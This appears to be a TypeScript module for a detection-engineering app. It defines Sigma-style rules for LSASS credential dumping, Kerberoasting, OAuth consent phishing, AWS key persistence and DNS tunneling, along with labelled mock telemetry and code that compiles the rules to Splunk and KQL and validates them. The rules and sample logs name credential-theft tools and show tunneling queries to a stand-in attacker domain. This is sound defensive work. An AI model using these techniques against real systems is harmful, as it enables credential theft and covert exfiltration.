// Project Athena Rules & Telemetry Datasets (Next.js Version)

export interface Logsource {
  category: string;
  product: string;
  service: string;
}

export interface DetectionBlock {
  condition: string;
  [key: string]: any;
}

export interface RemediationDetails {
  title: string;
  impact?: string;
  steps: string[];
  cmd?: string;
}

export interface Rule {
  id: string;
  title: string;
  description: string;
  status: string;
  severity: string;
  author: string;
  date: string;
  tags: string[];
  logsource: Logsource;
  detection: DetectionBlock;
  false_positives: string[];
  remediation: RemediationDetails;
  yaml_string: string;
}

// 1. RULE REGISTRY
export const RULES: Rule[] = [
  {
    id: "5b4e13d9-9fb2-47de-9852-ff14b9c1d3c5",
    title: "LSASS Process Access for Credential Dumping",
    description: "Detects suspicious process access requests targeting the Local Security Authority Subsystem Service (LSASS), which is a common precursor to credential theft (e.g., Mimikatz, Procdump).",
    status: "production",
    severity: "critical",
    author: "Detection Engineer",
    date: "2026-06-03",
    tags: ["attack.credential_access", "attack.t1003.001"],
    logsource: { category: "endpoint", product: "windows", service: "sysmon" },
    detection: {
      selection: {
        EventID: 10,
        TargetImage: "C:\\Windows\\System32\\lsass.exe",
        GrantedAccess: ["0x1010", "0x1410", "0x1F1F"]
      },
      filter_defender: {
        SourceImage: "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
      },
      filter_system: {
        SourceImage: "C:\\Windows\\System32\\svchost.exe"
      },
      condition: "selection and not (filter_defender or filter_system)"
    },
    false_positives: [
      "Antivirus and EDR agents scanning memory.",
      "Security configuration management agents or backup agents."
    ],
    remediation: {
      title: "Isolate Endpoint & Audit Credential Dumps",
      impact: "Prevents immediate lateral movement using stolen credentials.",
      steps: [
        "Isolate the source host immediately.",
        "Inspect the SourceImage file signature and location.",
        "Determine if a memory dump file (.dmp) was written to disk or exfiltrated.",
        "Reset credentials for any high-privilege users logged into the system."
      ]
    },
    yaml_string: `id: 5b4e13d9-9fb2-47de-9852-ff14b9c1d3c5
title: LSASS Process Access for Credential Dumping
description: Detects suspicious process access requests targeting the Local Security Authority Subsystem Service (LSASS).
status: production
severity: critical
author: Detection Engineer
date: 2026-06-03
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: endpoint
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage: 'C:\\Windows\\System32\\lsass.exe'
    GrantedAccess:
      - '0x1010'
      - '0x1410'
      - '0x1F1F'
  filter_defender:
    SourceImage: 'C:\\Program Files\\Windows Defender\\MsMpEng.exe'
  filter_system:
    SourceImage: 'C:\\Windows\\System32\\svchost.exe'
  condition: selection and not (filter_defender or filter_system)`
  },
  {
    id: "c46f772e-d00f-48d6-953e-52ebc2b7ab7f",
    title: "Active Directory Kerberoasting via Ticket Requests",
    description: "Detects Kerberos Service Ticket requests (Event ID 4769) requesting weak RC4 (0x17) encryption, typical of Kerberoasting attacks targeting service accounts.",
    status: "production",
    severity: "high",
    author: "Detection Engineer",
    date: "2026-06-03",
    tags: ["attack.credential_access", "attack.t1558.003"],
    logsource: { category: "identity", product: "active_directory", service: "security" },
    detection: {
      selection: {
        EventID: 4769,
        TicketEncryptionType: "0x17"
      },
      filter_computers: {
        ServiceName: "*$"
      },
      filter_krbtgt: {
        ServiceName: "krbtgt"
      },
      condition: "selection and not (filter_computers or filter_krbtgt)"
    },
    false_positives: [
      "Legacy applications that do not support AES encryption.",
      "Misconfigured internal service accounts."
    ],
    remediation: {
      title: "Migrate Service Accounts to AES256",
      impact: "Bridges Active Directory encryption weaknesses.",
      steps: [
        "Identify the user account that requested the ticket (TargetUserName).",
        "Check the source IP address (IpAddress) for other anomalous activity.",
        "Migrate the target Service account to use AES256 encryption.",
        "Rotate the password of the targeted service account."
      ]
    },
    yaml_string: `id: c46f772e-d00f-48d6-953e-52ebc2b7ab7f
title: Active Directory Kerberoasting via Ticket Requests
description: Detects Kerberos Service Ticket requests (Event ID 4769) requesting weak RC4 (0x17) encryption.
status: production
severity: high
author: Detection Engineer
date: 2026-06-03
tags:
  - attack.credential_access
  - attack.t1558.003
logsource:
  category: identity
  product: active_directory
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter_computers:
    ServiceName: '*$'
  filter_krbtgt:
    ServiceName: 'krbtgt'
  condition: selection and not (filter_computers or filter_krbtgt)`
  },
  {
    id: "e4617a22-38e2-411a-8bb7-09d57a9e0f6b",
    title: "OAuth Consent Grant to Malicious Application",
    description: "Detects when a user or administrator grants consent to an external OAuth application requesting high-privilege permissions, indicating potential consent phishing.",
    status: "production",
    severity: "high",
    author: "Detection Engineer",
    date: "2026-06-03",
    tags: ["attack.credential_access", "attack.t1528", "attack.persistence", "attack.t1098.003"],
    logsource: { category: "cloud", product: "azure_entra", service: "auditlogs" },
    detection: {
      selection: {
        OperationName: ["Consent to application", "Add OAuth2PermissionGrant"],
        ConsentType: "AllPrincipals"
      },
      selection_permissions: {
        Permissions: ["*Mail.Read*", "*Mail.Write*", "*Directory.ReadWrite.All*", "*Directory.AccessAsUser.All*", "*RoleManagement.ReadWrite.Directory*"]
      },
      condition: "selection and selection_permissions"
    },
    false_positives: [
      "Authorized enterprise applications integrated by IT administrators.",
      "Development tools approved for developer testing."
    ],
    remediation: {
      title: "Revoke OAuth Grant & Reset Admin Token",
      impact: "Severes API-based persistent access to user mailboxes.",
      steps: [
        "Identify the target user and the application client ID.",
        "Review the application registration details (publisher, redirect URIs).",
        "Revoke the OAuth consent grant in Entra ID.",
        "Review mail forwarding rules or sign-in logs for the affected user."
      ]
    },
    yaml_string: `id: e4617a22-38e2-411a-8bb7-09d57a9e0f6b
title: OAuth Consent Grant to Malicious Application
description: Detects when a user or administrator grants consent to an external OAuth application requesting high-privilege permissions.
status: production
severity: high
author: Detection Engineer
date: 2026-06-03
tags:
  - attack.credential_access
  - attack.t1528
  - attack.persistence
  - attack.t1098.003
logsource:
  category: cloud
  product: azure_entra
  service: auditlogs
detection:
  selection:
    OperationName:
      - 'Consent to application'
      - 'Add OAuth2PermissionGrant'
    ConsentType: 'AllPrincipals'
  selection_permissions:
    Permissions:
      - '*Mail.Read*'
      - '*Mail.Write*'
      - '*Directory.ReadWrite.All*'
      - '*Directory.AccessAsUser.All*'
      - '*RoleManagement.ReadWrite.Directory*'
  condition: selection and selection_permissions`
  },
  {
    id: "a24d8b99-a411-4824-9b2d-cf211a7a13fb",
    title: "AWS IAM Access Key Created for Persistence",
    description: "Detects when a new IAM Access Key is created in AWS by compromised users to establish long-term programmatic persistence.",
    status: "production",
    severity: "medium",
    author: "Detection Engineer",
    date: "2026-06-03",
    tags: ["attack.persistence", "attack.t1098", "attack.t1136.003"],
    logsource: { category: "cloud", product: "aws", service: "cloudtrail" },
    detection: {
      selection: {
        eventSource: "iam.amazonaws.com",
        eventName: "CreateAccessKey"
      },
      filter_terraform: {
        "userIdentity.arn": "arn:aws:iam::*:role/TerraformDeploymentRole"
      },
      filter_okta_sso: {
        "userIdentity.sessionContext.sessionIssuer.userName": "OktaSSO-*"
      },
      condition: "selection and not (filter_terraform or filter_okta_sso)"
    },
    false_positives: [
      "Legitimate developers generating keys for local development.",
      "Automated deployment scripts executing with admin privileges."
    ],
    remediation: {
      title: "Revoke Static Access Key",
      impact: "Terminates direct CLI persistence.",
      steps: [
        "Contact the user identified in the responseElements.accessKey.userName field to verify authorization.",
        "Disable or delete the newly created access key immediately.",
        "Check the user identity that called the API (caller) for other anomalous APIs.",
        "Enforce IAM policy that mandates AWS IAM Identity Center (SSO)."
      ]
    },
    yaml_string: `id: a24d8b99-a411-4824-9b2d-cf211a7a13fb
title: AWS IAM Access Key Created for Persistence
description: Detects when a new IAM Access Key is created in AWS.
status: production
severity: medium
author: Detection Engineer
date: 2026-06-03
tags:
  - attack.persistence
  - attack.t1098
  - attack.t1136.003
logsource:
  category: cloud
  product: aws
  service: cloudtrail
detection:
  selection:
    eventSource: 'iam.amazonaws.com'
    eventName: 'CreateAccessKey'
  filter_terraform:
    userIdentity.arn: 'arn:aws:iam::*:role/TerraformDeploymentRole'
  filter_okta_sso:
    userIdentity.sessionContext.sessionIssuer.userName: 'OktaSSO-*'
  condition: selection and not (filter_terraform or filter_okta_sso)`
  },
  {
    id: "d8d74542-a8b2-4d26-bb21-1d361c47a544",
    title: "Suspicious DNS Tunneling Query Activity",
    description: "Detects network systems making DNS queries with abnormally long query strings (length > 80 characters), typical of DNS tunneling techniques.",
    status: "test",
    severity: "high",
    author: "Detection Engineer",
    date: "2026-06-03",
    tags: ["attack.command_and_control", "attack.t1071.004", "attack.exfiltration", "attack.t1048.003"],
    logsource: { category: "network", product: "dns", service: "queries" },
    detection: {
      selection: {
        query_length: "> 80",
        query_type: ["TXT", "CNAME", "A"]
      },
      filter_common: {
        query: ["*.akamaiedge.net", "*.cloudfront.net"]
      },
      condition: "selection and not filter_common"
    },
    false_positives: [
      "Complex content delivery networks (CDNs) checking reputations.",
      "Development domains that use long hash-based subdomains."
    ],
    remediation: {
      title: "Block Destination Domain at DNS Firewall",
      impact: "Terminates network communication channel instantly.",
      steps: [
        "Identify the source IP making the request.",
        "Analyze the destination domain's creation date and reputation.",
        "Review network traffic from the source IP to see if external C2 channels are active.",
        "Block the destination domain at the DNS firewall / resolver level."
      ]
    },
    yaml_string: `id: d8d74542-a8b2-4d26-bb21-1d361c47a544
title: Suspicious DNS Tunneling Query Activity
description: Detects network systems making DNS queries with abnormally long query strings (length > 80 characters).
status: test
severity: high
author: Detection Engineer
date: 2026-06-03
tags:
  - attack.command_and_control
  - attack.t1071.004
  - attack.exfiltration
  - attack.t1048.003
logsource:
  category: network
  product: dns
  service: queries
detection:
  selection:
    query_length: '> 80'
    query_type:
      - 'TXT'
      - 'CNAME'
      - 'A'
  filter_common:
    query:
      - '*.akamaiedge.net'
      - '*.cloudfront.net'
  condition: selection and not filter_common`
  }
];

// 2. MOCK DATASETS
export const MOCK_TELEMETRY: Record<string, any[]> = {
  "5b4e13d9-9fb2-47de-9852-ff14b9c1d3c5": [
    {
      "EventID": 10,
      "SourceImage": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
      "GrantedAccess": "0x1410",
      "CallTrace": "C:\\Windows\\System32\\ntdll.dll+0xa120|C:\\Program Files\\Windows Defender\\MsMpEng.exe+0x2213",
      "label": "benign"
    },
    {
      "EventID": 10,
      "SourceImage": "C:\\Windows\\System32\\svchost.exe",
      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
      "GrantedAccess": "0x1F1F",
      "CallTrace": "C:\\Windows\\System32\\ntdll.dll+0xa120|C:\\Windows\\System32\\kernel32.dll+0x1450",
      "label": "benign"
    },
    {
      "EventID": 10,
      "SourceImage": "C:\\Windows\\System32\\taskmgr.exe",
      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
      "GrantedAccess": "0x1410",
      "CallTrace": "C:\\Windows\\System32\\ntdll.dll+0xa120|C:\\Windows\\System32\\taskmgr.exe+0x5501",
      "label": "benign"
    },
    {
      "EventID": 10,
      "SourceImage": "C:\\Windows\\Temp\\mimikatz.exe",
      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
      "GrantedAccess": "0x1010",
      "CallTrace": "unknown+0x1200",
      "label": "malicious"
    },
    {
      "EventID": 10,
      "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
      "GrantedAccess": "0x1F1F",
      "CallTrace": "C:\\Windows\\System32\\comsvcs.dll+0x2410",
      "label": "malicious"
    },
    {
      "EventID": 10,
      "SourceImage": "C:\\Users\\Public\\procdump.exe",
      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
      "GrantedAccess": "0x1F1F",
      "CallTrace": "C:\\Windows\\System32\\ntdll.dll+0xa120|C:\\Users\\Public\\procdump.exe+0x4310",
      "label": "malicious"
    },
    {
      "EventID": 10,
      "SourceImage": "C:\\Windows\\System32\\cmd.exe",
      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
      "GrantedAccess": "0x0010",
      "CallTrace": "C:\\Windows\\System32\\cmd.exe+0x1020",
      "label": "benign"
    }
  ],
  "c46f772e-d00f-48d6-953e-52ebc2b7ab7f": [
    {
      "EventID": 4769,
      "ServiceName": "MSSQLSvc$",
      "TicketEncryptionType": "0x12",
      "TicketOptions": "0x40810000",
      "TargetUserName": "SQLAdmin",
      "IpAddress": "192.168.10.15",
      "label": "benign"
    },
    {
      "EventID": 4769,
      "ServiceName": "krbtgt",
      "TicketEncryptionType": "0x17",
      "TicketOptions": "0x40810000",
      "TargetUserName": "user.jane",
      "IpAddress": "192.168.10.45",
      "label": "benign"
    },
    {
      "EventID": 4769,
      "ServiceName": "WS-PROD-SRV01$",
      "TicketEncryptionType": "0x17",
      "TicketOptions": "0x40810000",
      "TargetUserName": "WS-PROD-SRV01$",
      "IpAddress": "192.168.10.11",
      "label": "benign"
    },
    {
      "EventID": 4769,
      "ServiceName": "web_prod_service",
      "TicketEncryptionType": "0x17",
      "TicketOptions": "0x40810000",
      "TargetUserName": "john.doe",
      "IpAddress": "10.0.2.15",
      "label": "malicious"
    },
    {
      "EventID": 4769,
      "ServiceName": "sql_billing_srv",
      "TicketEncryptionType": "0x17",
      "TicketOptions": "0x40810000",
      "TargetUserName": "john.doe",
      "IpAddress": "10.0.2.15",
      "label": "malicious"
    },
    {
      "EventID": 4769,
      "ServiceName": "backup_agent_acct",
      "TicketEncryptionType": "0x12",
      "TicketOptions": "0x40810000",
      "TargetUserName": "backup.service",
      "IpAddress": "192.168.10.12",
      "label": "benign"
    }
  ],
  "e4617a22-38e2-411a-8bb7-09d57a9e0f6b": [
    {
      "OperationName": "Consent to application",
      "ConsentType": "Principal",
      "Result": "success",
      "InitiatedBy": "user.smith@enterprise-mock.com",
      "TargetResources": "Office365 Calendar Sync App",
      "Permissions": "Mail.Read, Calendars.Read",
      "label": "benign"
    },
    {
      "OperationName": "Consent to application",
      "ConsentType": "AllPrincipals",
      "Result": "success",
      "InitiatedBy": "admin.jones@enterprise-mock.com",
      "TargetResources": "Zoom Integration",
      "Permissions": "User.Read, Calendars.Read.Shared, openid",
      "label": "benign"
    },
    {
      "OperationName": "Consent to application",
      "ConsentType": "AllPrincipals",
      "Result": "success",
      "InitiatedBy": "admin.jones@enterprise-mock.com",
      "TargetResources": "eDiscovery Exporter",
      "Permissions": "Mail.ReadWrite, User.Read.All, Offline_Access",
      "label": "malicious"
    },
    {
      "OperationName": "Add OAuth2PermissionGrant",
      "ConsentType": "AllPrincipals",
      "Result": "success",
      "InitiatedBy": "compromised.admin@enterprise-mock.com",
      "TargetResources": "SpamFilterEnhancerPro",
      "Permissions": "Directory.ReadWrite.All, Directory.AccessAsUser.All",
      "label": "malicious"
    },
    {
      "OperationName": "Update application",
      "ConsentType": "AllPrincipals",
      "Result": "success",
      "InitiatedBy": "admin.jones@enterprise-mock.com",
      "TargetResources": "Internal Dashboard",
      "Permissions": "User.Read",
      "label": "benign"
    }
  ],
  "a24d8b99-a411-4824-9b2d-cf211a7a13fb": [
    {
      "eventSource": "iam.amazonaws.com",
      "eventName": "CreateAccessKey",
      "userIdentity": {
        "arn": "arn:aws:iam::123456789012:role/TerraformDeploymentRole"
      },
      "requestParameters": {
        "userName": "app-runner-service"
      },
      "userAgent": "HashiCorp/1.0.0 (Terraform)",
      "label": "benign"
    },
    {
      "eventSource": "iam.amazonaws.com",
      "eventName": "CreateAccessKey",
      "userIdentity": {
        "arn": "arn:aws:iam::123456789012:assumed-role/OktaSSO-Developer/dev-session",
        "sessionContext": {
          "sessionIssuer": {
            "userName": "OktaSSO-Developer"
          }
        }
      },
      "requestParameters": {
        "userName": "dev-user-key"
      },
      "userAgent": "aws-cli/2.15.0 Python/3.11.5 Windows/10",
      "label": "benign"
    },
    {
      "eventSource": "iam.amazonaws.com",
      "eventName": "CreateAccessKey",
      "userIdentity": {
        "arn": "arn:aws:iam::123456789012:user/backdoor-test",
        "sessionContext": null
      },
      "requestParameters": {
        "userName": "backdoor-test"
      },
      "userAgent": "aws-sdk-go/1.44.20",
      "label": "malicious"
    },
    {
      "eventSource": "s3.amazonaws.com",
      "eventName": "PutObject",
      "userIdentity": {
        "arn": "arn:aws:iam::123456789012:user/backdoor-test"
      },
      "requestParameters": {
        "bucketName": "sensitive-data-enterprise-mock"
      },
      "userAgent": "aws-cli/2.15.0",
      "label": "benign"
    }
  ],
  "d8d74542-a8b2-4d26-bb21-1d361c47a544": [
    {
      "query": "www.google.com",
      "query_type": "A",
      "query_length": 14,
      "src_ip": "192.168.1.105",
      "reply_code": "NOERROR",
      "label": "benign"
    },
    {
      "query": "super-long-content-delivery-cdn-endpoint-hash-123456789abcdef.akamaiedge.net",
      "query_type": "CNAME",
      "query_length": 86,
      "src_ip": "192.168.1.105",
      "reply_code": "NOERROR",
      "label": "benign"
    },
    {
      "query": "e2c39d82fb10a459b9cd837de821c9d8a3be019cd82fab409cd83a09e.attacker-domain.com",
      "query_type": "TXT",
      "query_length": 90,
      "src_ip": "10.0.5.21",
      "reply_code": "NOERROR",
      "label": "malicious"
    },
    {
      "query": "beacon-ping-v1-seq021-cmd-execute-shell-session-keepalive.attacker-domain.com",
      "query_type": "CNAME",
      "query_length": 88,
      "src_ip": "10.0.5.21",
      "reply_code": "NOERROR",
      "label": "malicious"
    },
    {
      "query": "client.updater.malicious-domain-short.com",
      "query_type": "A",
      "query_length": 41,
      "src_ip": "10.0.5.21",
      "reply_code": "NXDOMAIN",
      "label": "benign"
    }
  ]
};

// 3. COMPILER ENGINE (Sigma -> SPL / KQL)
const LOGSOURCE_MAPPINGS: Record<string, { splunk: string; kql: string }> = {
  "endpoint:windows:sysmon": {
    splunk: 'index=ep_sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"',
    kql: "SysmonEventLogs"
  },
  "identity:active_directory:security": {
    splunk: 'index=ad_security sourcetype="WinEventLog:Security"',
    kql: "SecurityEvent"
  },
  "cloud:azure_entra:auditlogs": {
    splunk: 'index=cloud_entra sourcetype="azure:aad:audit"',
    kql: "AuditLogs"
  },
  "cloud:aws:cloudtrail": {
    splunk: 'index=aws_cloudtrail sourcetype="aws:cloudtrail"',
    kql: "AWSCloudTrail"
  },
  "network:dns:queries": {
    splunk: 'index=net_dns sourcetype="infoblox:dns"',
    kql: "DnsEvents"
  }
};

function getBaseFilter(logsource: Logsource, targetSiem: 'splunk' | 'kql'): string {
  const key = `${logsource.category}:${logsource.product}:${logsource.service}`;
  const mapping = LOGSOURCE_MAPPINGS[key];
  if (mapping) {
    return mapping[targetSiem];
  }
  return targetSiem === 'splunk' 
    ? `index=security sourcetype="${logsource.product}:${logsource.service}"`
    : `${logsource.product.charAt(0).toUpperCase() + logsource.product.slice(1)}Logs`;
}

function compileValue(field: string, value: any, targetSiem: 'splunk' | 'kql'): string {
  const valStr = String(value);

  // Numeric comparisons (> 80, <= 10)
  if (typeof value === 'string' && /^[><=]/.test(value)) {
    const match = value.match(/^([><=]+)\s*(.*)$/);
    if (match) {
      const [, op, valNum] = match;
      const opSiem = (targetSiem === 'kql' && op === '=') ? '==' : op;
      return `${field} ${opSiem} ${valNum}`;
    }
  }

  // Lists
  if (Array.isArray(value)) {
    const escaped = value.map(v => `"${v}"`).join(', ');
    return targetSiem === 'splunk' 
      ? `${field} IN (${escaped})`
      : `${field} in (${escaped})`;
  }

  // Wildcards
  if (valStr.includes('*')) {
    if (targetSiem === 'splunk') {
      return `${field}="${valStr}"`;
    } else {
      if (valStr.startsWith('*') && valStr.endsWith('*')) {
        return `${field} contains "${valStr.slice(1, -1)}"`;
      } else if (valStr.startsWith('*')) {
        return `${field} endswith "${valStr.slice(1)}"`;
      } else if (valStr.endsWith('*')) {
        return `${field} startswith "${valStr.slice(0, -1)}"`;
      }
      return `${field} matches regex "(?i)^${valStr.replace(/\*/g, '.*')}$"`;
    }
  }

  // Standard equality
  if (targetSiem === 'splunk') {
    return `${field}="${valStr}"`;
  } else {
    if (valStr.toLowerCase() === 'true' || valStr.toLowerCase() === 'false') {
      return `${field} == ${valStr.toLowerCase()}`;
    }
    if (/^\d+$/.test(valStr)) {
      return `${field} == ${valStr}`;
    }
    return `${field} == "${valStr}"`;
  }
}

function compileSelector(selectorData: any, targetSiem: 'splunk' | 'kql'): string {
  const clauses: string[] = [];
  for (const [field, value] of Object.entries(selectorData)) {
    const siemField = targetSiem === 'kql' ? field.replace(/\./g, '_') : field;
    clauses.push(compileValue(siemField, value, targetSiem));
  }
  const op = targetSiem === 'splunk' ? ' AND ' : ' and ';
  const result = clauses.join(op);
  return clauses.length > 1 ? `(${result})` : result;
}

export function compileToSplunk(rule: Rule): string {
  const base = getBaseFilter(rule.logsource, 'splunk');
  const detection = rule.detection;
  let condition = detection.condition;

  const selectorsCompiled: Record<string, string> = {};
  for (const [key, value] of Object.entries(detection)) {
    if (key !== 'condition') {
      selectorsCompiled[key] = compileSelector(value, 'splunk');
    }
  }

  // Replace identifiers sorted by length descending
  const sortedKeys = Object.keys(selectorsCompiled).sort((a, b) => b.length - a.length);
  for (const key of sortedKeys) {
    const rx = new RegExp(`\\b${key}\\b`, 'g');
    condition = condition.replace(rx, selectorsCompiled[key]);
  }

  // Map boolean operators
  condition = condition
    .replace(/\band\b/g, 'AND')
    .replace(/\bor\b/g, 'OR')
    .replace(/\bnot\b/g, 'NOT')
    .replace(/\s+/g, ' ')
    .trim();

  return `${base} ${condition}`;
}

export function compileToKql(rule: Rule): string {
  const base = getBaseFilter(rule.logsource, 'kql');
  const detection = rule.detection;
  let condition = detection.condition;

  const selectorsCompiled: Record<string, string> = {};
  for (const [key, value] of Object.entries(detection)) {
    if (key !== 'condition') {
      selectorsCompiled[key] = compileSelector(value, 'kql');
    }
  }

  const sortedKeys = Object.keys(selectorsCompiled).sort((a, b) => b.length - a.length);
  for (const key of sortedKeys) {
    const rx = new RegExp(`\\b${key}\\b`, 'g');
    condition = condition.replace(rx, selectorsCompiled[key]);
  }

  condition = condition
    .replace(/\band\b/gi, 'and')
    .replace(/\bor\b/gi, 'or')
    .replace(/\bnot\b/gi, 'not')
    .replace(/\s+/g, ' ')
    .trim();

  return `${base}\n| where ${condition}`;
}

// 4. VALIDATOR ENGINE (Purple Teaming Simulation)
function matchValue(recordVal: any, ruleVal: any): boolean {
  if (recordVal === undefined || recordVal === null) return false;
  
  const recStr = String(recordVal).toLowerCase();

  // Numeric check
  if (typeof ruleVal === 'string' && /^[><=]/.test(ruleVal)) {
    const match = ruleVal.match(/^([><=]+)\s*(.*)$/);
    if (match) {
      const [, op, valNumStr] = match;
      const rNum = parseFloat(recordVal);
      const limit = parseFloat(valNumStr);
      if (!isNaN(rNum) && !isNaN(limit)) {
        if (op === '>') return rNum > limit;
        if (op === '<') return rNum < limit;
        if (op === '>=') return rNum >= limit;
        if (op === '<=') return rNum <= limit;
        if (op === '=' || op === '==') return rNum === limit;
      }
    }
  }

  // Arrays
  if (Array.isArray(ruleVal)) {
    return ruleVal.some(val => matchValue(recordVal, val));
  }

  // Wildcards
  const ruleStr = String(ruleVal).toLowerCase();
  if (ruleStr.includes('*')) {
    if (ruleStr.startsWith('*') && ruleStr.endsWith('*')) {
      return recStr.includes(ruleStr.slice(1, -1));
    }
    if (ruleStr.startsWith('*')) {
      return recStr.endsWith(ruleStr.slice(1));
    }
    if (ruleStr.endsWith('*')) {
      return recStr.startsWith(ruleStr.slice(0, -1));
    }
    const rx = new RegExp('^' + ruleStr.replace(/\*/g, '.*') + '$');
    return rx.test(recStr);
  }

  return recStr === ruleStr;
}

function evaluateSelector(selectorData: any, record: any): boolean {
  for (const [field, ruleVal] of Object.entries(selectorData)) {
    // Check nested objects
    let recordVal = record[field];
    if (recordVal === undefined && field.includes('.')) {
      const parts = field.split('.');
      let temp = record;
      for (const part of parts) {
        if (temp && typeof temp === 'object' && part in temp) {
          temp = temp[part];
        } else {
          temp = undefined;
          break;
        }
      }
      recordVal = temp;
    }
    // Backup for flat underscore replacement
    if (recordVal === undefined && field.includes('.')) {
      recordVal = record[field.replace(/\./g, '_')];
    }

    if (!matchValue(recordVal, ruleVal)) {
      return false;
    }
  }
  return true;
}

export function evaluateRuleAgainstRecord(rule: Rule, record: any): boolean {
  const detection = rule.detection;
  const condition = detection.condition;

  const selectorResults: Record<string, boolean> = {};
  for (const [key, value] of Object.entries(detection)) {
    if (key !== 'condition') {
      selectorResults[key] = evaluateSelector(value, record);
    }
  }

  // Parse condition manually to prevent eval block for security.
  // Replacing selection block strings with their boolean literals 'true' / 'false'
  let cleanCond = condition.toLowerCase();
  const sortedKeys = Object.keys(selectorResults).sort((a, b) => b.length - a.length);
  for (const key of sortedKeys) {
    const rx = new RegExp(`\\b${key}\\b`, 'g');
    cleanCond = cleanCond.replace(rx, String(selectorResults[key]));
  }

  // Map words
  cleanCond = cleanCond
    .replace(/\band\b/g, '&&')
    .replace(/\bor\b/g, '||')
    .replace(/\bnot\b/g, '!');

  try {
    // Safe evaluation since it only contains boolean operators, spaces, parentheses and true/false literals
    return Function(`"use strict"; return (${cleanCond})`)();
  } catch (e) {
    console.error(`Condition evaluation error for condition (${condition}):`, e);
    return false;
  }
}

export interface ValidationReport {
  total_logs: number;
  true_positives: number;
  false_positives: number;
  true_negatives: number;
  false_negatives: number;
  precision: number;
  recall: number;
  f1_score: number;
}

export function runValidation(rule: Rule, dataset: any[]): ValidationReport {
  let tp = 0;
  let fp = 0;
  let tn = 0;
  let fn = 0;

  for (const record of dataset) {
    const triggered = evaluateRuleAgainstRecord(rule, record);
    const label = record.label || 'benign';

    if (triggered) {
      if (label === 'malicious') tp++;
      else fp++;
    } else {
      if (label === 'malicious') fn++;
      else tn++;
    }
  }

  const total = dataset.length;
  const precision = (tp + fp) > 0 ? tp / (tp + fp) : 0;
  const recall = (tp + fn) > 0 ? tp / (tp + fn) : 0;
  const f1 = (precision + recall) > 0 ? (2 * precision * recall) / (precision + recall) : 0;

  return {
    total_logs: total,
    true_positives: tp,
    false_positives: fp,
    true_negatives: tn,
    false_negatives: fn,
    precision: Math.round(precision * 10000) / 10000,
    recall: Math.round(recall * 10000) / 10000,
    f1_score: Math.round(f1 * 10000) / 10000
  };
}

// 5. TELEMETRY QUALITY & GAP AUDITOR
export interface AuditFieldReport {
  field: string;
  description: string;
  status: 'Present' | 'Missing';
  value: string;
}

export interface AuditReport {
  log_source_name: string;
  health_score: number;
  status: 'HEALTHY' | 'WARNING' | 'CRITICAL';
  checked_fields: AuditFieldReport[];
  missing_fields: string[];
  gpo_remediation: string;
  sysmon_remediation?: string;
}

export const TELEMETRY_REQUIREMENTS: Record<string, {
  name: string;
  required_fields: Record<string, string>;
  gpo_remediation: string;
  sysmon_remediation?: string;
}> = {
  sysmon: {
    name: 'Microsoft Windows Sysmon Telemetry',
    required_fields: {
      EventID: 'Enables parsing and routing of log types.',
      SourceImage: 'Identifies the initiating process. Critical for identifying compromised binaries.',
      TargetImage: 'Identifies the target process or DLL being accessed.',
      GrantedAccess: 'Specific permissions requested. Critical to differentiate memory dumps from normal API calls.',
      CallTrace: 'The stack trace of the thread. Vital for detecting shellcode injections.'
    },
    gpo_remediation: 'Configure Group Policy: Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Advanced Audit Policy Configuration -> System Audit Policies -> Detailed Tracking -> Audit Process Creation (Success & Failure).',
    sysmon_remediation: 'Install and update Sysmon with a configuration template (such as SwiftOnSecurity or Olaf Hartong\'s config) ensuring Event ID 10 (ProcessAccess) is enabled and targeting lsass.exe.'
  },
  active_directory: {
    name: 'Windows Security Event Log (Active Directory)',
    required_fields: {
      EventID: 'Enables identifying AD security event types.',
      TargetUserName: 'Identifies the user account requesting tickets or modification.',
      ServiceName: 'Identifies the targeted service principal name (SPN).',
      TicketEncryptionType: 'Identifies encryption cipher (e.g. 0x17 for RC4 vs 0x12 for AES256). Crucial for Kerberoasting.',
      IpAddress: 'The source client IP address. Required to trace physical host location.'
    },
    gpo_remediation: 'Enable Kerberos Service Ticket Operations auditing. Group Policy: Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Advanced Audit Policy Configuration -> Account Logons -> Audit Kerberos Service Ticket Operations (Success & Failure).'
  },
  azure_entra: {
    name: 'Microsoft Entra ID (Azure AD) Audit Logs',
    required_fields: {
      OperationName: 'Specifies the action performed (e.g. Consent to application).',
      Result: 'Specifies success or failure of the operations.',
      InitiatedBy: 'Identity of the actor (user, admin, or service principal) who performed the action.',
      TargetResources: 'Details of the application, user, or object that was modified.',
      Permissions: 'Permissions granted in the OAuth token. Vital for identifying malicious OAuth consent phishing.'
    },
    gpo_remediation: 'Ensure Microsoft Entra ID Diagnostic Settings are configured to stream AuditLogs and SignInLogs to your Log Analytics Workspace (Azure Sentinel).'
  },
  aws: {
    name: 'AWS CloudTrail Audit Logs',
    required_fields: {
      eventSource: 'Identifies the AWS service receiving the API call (e.g., iam.amazonaws.com).',
      eventName: 'Identifies the API action (e.g., CreateAccessKey).',
      userIdentity: 'Full details of the caller (IAM User, Role, SAML session, root).',
      requestParameters: 'The parameters of the API call. Crucial to verify which username or policy was affected.',
      userAgent: 'The client software used to make the call (reveals automated scripts, console, CLI).'
    },
    gpo_remediation: 'Configure a multi-region AWS CloudTrail Trail, configure integration with CloudWatch Logs, and stream trail JSON logs to a centralized S3 bucket for SIEM ingestion.'
  },
  dns: {
    name: 'DNS Query Telemetry',
    required_fields: {
      query: 'The requested domain name (e.g., dynamic.malicious-site.com).',
      query_type: 'DNS record type (A, AAAA, TXT, CNAME, MX). TXT and CNAME are critical for tunneling.',
      src_ip: 'The source IP of the client resolving the domain.',
      query_length: 'Length of the query string. Vital metadata for automated exfiltration detection.',
